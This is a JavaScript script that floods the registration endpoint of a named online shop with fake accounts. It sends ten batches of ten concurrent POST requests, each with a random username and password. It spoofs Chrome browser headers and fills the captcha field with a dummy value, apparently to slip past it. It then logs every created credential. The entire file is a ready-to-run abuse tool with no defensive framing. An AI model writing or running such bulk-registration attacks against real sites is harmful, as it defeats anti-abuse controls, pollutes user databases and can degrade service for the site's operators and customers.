const endpoint = "https://mayashop.xyz/system/register.php";
const batchSize = 10; // Number of user registrations in each batch
const numThreads = 10; // Number of concurrent threads

function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

async function registerUser(usname, pspass) {
  const formData = new FormData();
  formData.append('user', usname);
  formData.append('pass', pspass);
  formData.append('pass2', pspass);
  formData.append('captcha', '[object HTMLDivElement]');

  const requestOptions = {
    method: 'POST',
    mode: 'cors',
    credentials: 'include',
    headers: {
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9,th;q=0.8',
      'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'x-requested-with': 'XMLHttpRequest',
    },
    referrer: 'https://mayashop.xyz/?page=register',
    referrerPolicy: 'strict-origin-when-cross-origin',
    body: formData,
  };

  return fetch(endpoint, requestOptions)
    .then(response => response.text())
    .then(data => ({ usname, pspass, data }));
}

async function registerUsersInBatch() {
  const batchPromises = [];

  for (let i = 0; i < batchSize; i++) {
    const usname = generateRandomString(8);
    const pspass = generateRandomString(8);

    batchPromises.push(registerUser(usname, pspass));
  }

  return Promise.all(batchPromises);
}

async function runThreads() {
  const threadPromises = [];

  for (let i = 0; i < numThreads; i++) {
    threadPromises.push(registerUsersInBatch());
  }

  const allThreads = await Promise.all(threadPromises);

  allThreads.flat().forEach(response => {
    console.log('Random usname:', response.usname);
    console.log('Random pspass:', response.pspass);
    console.log('Response:', response.data);
  });
}

// Run the registration process in threads
runThreads();
